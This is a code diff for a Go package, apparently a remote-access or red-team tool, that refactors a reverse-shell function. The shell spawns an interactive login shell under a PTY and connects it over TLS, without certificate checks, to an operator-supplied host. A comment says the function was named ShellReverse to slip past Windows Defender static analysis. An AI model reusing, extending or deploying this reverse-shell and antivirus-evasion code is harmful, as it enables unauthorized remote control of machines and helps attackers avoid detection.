@@ -4,6 +4,7 @@ package tacos
 
 import (
 	"crypto/tls"
+	"fmt"
 	"io"
 	"log"
 	"net"
@@ -46,14 +47,24 @@ func DetectDefaultShell() (shell string) {
 	return shell
 }
 
-// ShellReverse spawns a reverse shell with PTY targeting host (ip:port).
-// (Name is ShellReverse because ReverseShell does not pass windows defender static analysis)
-func ShellReverse(host string, shell string, timeoutSec int, maxRetries int) {
-	logger.AddFilenameAndLinePrefix(log.Default())
+// ShellArgs returns the appropriate flags for the given shell.
+// bash gets "-li" (login + interactive), other interactive shells get "-i".
+func ShellArgs(shell string) []string {
+	if strings.Contains(shell, "bash") {
+		return []string{"-li"}
+	}
+	if strings.Contains(shell, "zsh") || strings.Contains(shell, "csh") || strings.Contains(shell, "tsh") || strings.Contains(shell, "/sh") {
+		return []string{"-i"}
+	}
+	return nil
+}
+
+// ConnectTLS dials a TLS connection to host with retry logic.
+// Returns the connection or an error if all attempts fail.
+func ConnectTLS(host string, timeoutSec int, maxRetries int) (*tls.Conn, error) {
 	conf := &tls.Config{
 		InsecureSkipVerify: true,
 	}
-
 	dialer := &net.Dialer{
 		Timeout: time.Duration(timeoutSec) * time.Second,
 	}
@@ -63,25 +74,28 @@ func ShellReverse(host string, shell string, timeoutSec int, maxRetries int) {
 	for attempt := 0; attempt <= maxRetries; attempt++ {
 		conn, err = tls.DialWithDialer(dialer, "tcp", host, conf)
 		if err == nil {
-			break
+			return conn, nil
 		}
 		log.Printf("Connection attempt %d/%d failed: %s", attempt+1, maxRetries+1, err)
 		if attempt < maxRetries {
 			time.Sleep(2 * time.Second)
 		}
 	}
+	return nil, fmt.Errorf("failed to connect to %s after %d attempt(s): %w", host, maxRetries+1, err)
+}
+
+// ShellReverse spawns a reverse shell with PTY targeting host (ip:port).
+// (Name is ShellReverse because ReverseShell does not pass windows defender static analysis)
+func ShellReverse(host string, shell string, timeoutSec int, maxRetries int) {
+	logger.AddFilenameAndLinePrefix(log.Default())
+
+	conn, err := ConnectTLS(host, timeoutSec, maxRetries)
 	if err != nil {
-		log.Fatalf("Failed to connect to %s after %d attempt(s): %s", host, maxRetries+1, err)
+		log.Fatalf("%s", err)
 	}
 	defer conn.Close()
 
-	var args []string
-	if strings.Contains(shell, "bash") {
-		args = append(args, "-li")
-	} else if strings.Contains(shell, "zsh") || strings.Contains(shell, "csh") || strings.Contains(shell, "tsh") || strings.Contains(shell, "/sh") {
-		args = append(args, "-i")
-	}
-
+	args := ShellArgs(shell)
 	cmd := exec.Command(shell, args...)
 
 	ptmx, err := pty.Start(cmd)
